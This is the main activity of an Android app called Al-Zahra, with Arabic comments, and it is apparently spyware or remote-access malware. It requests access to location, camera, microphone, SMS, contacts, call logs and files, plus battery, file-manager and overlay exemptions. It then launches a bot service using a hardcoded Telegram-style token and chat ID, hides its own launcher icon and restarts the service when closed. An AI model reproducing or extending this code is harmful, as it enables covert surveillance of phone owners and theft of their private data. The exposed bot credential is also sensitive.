package com.alzahra;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.alzahra.services.BotService;
import com.alzahra.services.CoreService;

public class MainActivity extends Activity {
    private static final String TAG = "MainActivity";
    private static final int PERMISSION_CODE = 100;
    private static final int BATTERY_OPT_CODE = 200;
    
    public static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
    public static final String CHAT_ID = "7344776596";
    
    private int permissionIndex = 0;
    private String[] permissions;
    private boolean servicesStarted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Log.d(TAG, "=== Al-Zahra Starting ===");
        
        // الأذونات حسب إصدار Android
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO
            };
        } else {
            permissions = new String[]{
                Manifest.permission.INTERNET,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE
            };
        }
        
        // بدء طلب الأذونات بعد ثانية للتأكد من تحميل الواجهة
        new Handler(Looper.getMainLooper()).postDelayed(this::checkPermissions, 1000);
    }
    
    private void checkPermissions() {
        if (permissionIndex >= permissions.length) {
            requestSpecialPermissions();
            return;
        }
        
        String permission = permissions[permissionIndex];
        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_CODE);
        } else {
            permissionIndex++;
            checkPermissions();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);
        permissionIndex++;
        new Handler(Looper.getMainLooper()).postDelayed(this::checkPermissions, 500);
    }
    
    private void requestSpecialPermissions() {
        // تجاهل تحسين البطارية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, BATTERY_OPT_CODE);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Battery opt error: " + e.getMessage());
                }
            }
        }
        
        // إدارة الملفات الكاملة (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    startActivity(intent);
                    return;
                } catch (Exception e) {
                    Log.e(TAG, "Storage manager error: " + e.getMessage());
                }
            }
        }
        
        // الظهور فوق التطبيقات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "Overlay error: " + e.getMessage());
                }
            }
        }
        
        // بدء الخدمات بعد جميع الأذونات
        startServicesSafely();
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // متابعة باقي الأذونات الخاصة
        new Handler(Looper.getMainLooper()).postDelayed(this::requestSpecialPermissions, 1000);
    }
    
    private void startServicesSafely() {
        try {
            Log.d(TAG, "=== Starting Services ===");
            
            // بدء CoreService
            Intent coreIntent = new Intent(this, CoreService.class);
            startService(coreIntent);
            
            // بدء BotService مع البيانات
            Intent botIntent = new Intent(this, BotService.class);
            botIntent.putExtra("token", BOT_TOKEN);
            botIntent.putExtra("chat_id", CHAT_ID);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(botIntent);
            } else {
                startService(botIntent);
            }
            
            servicesStarted = true;
            Toast.makeText(this, "✅ تم التفعيل بنجاح!", Toast.LENGTH_LONG).show();
            
            // إخفاء التطبيق بعد تأكد تشغيل الخدمات (بعد 5 ثوانٍ)
            new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, 5000);
            
        } catch (Exception e) {
            Log.e(TAG, "Service start error: " + e.getMessage());
            Toast.makeText(this, "⚠️ خطأ: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
    
    private void hideAppIcon() {
        if (!servicesStarted) {
            Log.e(TAG, "Cannot hide: services not started");
            return;
        }
        
        try {
            PackageManager pm = getPackageManager();
            pm.setComponentEnabledSetting(new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            Log.d(TAG, "App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "Hide icon error: " + e.getMessage());
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // إعادة تشغيل الخدمات إذا تم إغلاق النشاط
        if (servicesStarted) {
            try {
                Intent intent = new Intent(this, BotService.class);
                intent.putExtra("token", BOT_TOKEN);
                intent.putExtra("chat_id", CHAT_ID);
                startService(intent);
            } catch (Exception e) {
                Log.e(TAG, "Restart on destroy error: " + e.getMessage());
            }
        }
    }
}
